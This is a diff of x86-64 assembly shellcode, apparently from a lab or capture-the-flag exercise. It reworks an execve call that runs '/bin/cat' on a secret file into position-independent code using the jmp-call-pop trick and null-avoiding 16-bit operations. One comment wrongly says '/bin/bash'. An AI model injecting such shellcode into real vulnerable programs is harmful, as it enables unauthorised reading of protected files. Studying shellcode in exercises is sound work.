@@ -1,31 +1,26 @@
 [bits 64]
 
-section .data
-shell: db "/bin/cat", 0, "secret", 0
-
-global _start
 section .text
+global _start
 _start:
-	call where
-where:
-	pop rsi
-
-	; 1 - address of /bin/cat string
-	push shell
+	jmp short message
+dowork:
 	pop rdi
 
+	; 1 - address of /bin/cat string
+	push rdi
 
 	; execve
 	xor rax, rax
-	add rax, 59
+	add ax, 59
 	
 	; array
 	push 0
 
-	; skip /bin/cat\0
-	add rdi, 9
+	; skip /bin/bash\0
+	add di, 9
 	push rdi
-	sub rdi, 9
+	sub di, 9
 	push rdi
 
 	; 2 - array address
@@ -34,3 +29,7 @@ where:
 	xor rdx, rdx
 	
 	syscall
+
+message:
+	call dowork
+	db "/bin/cat", 0, "contrib/secret", 0
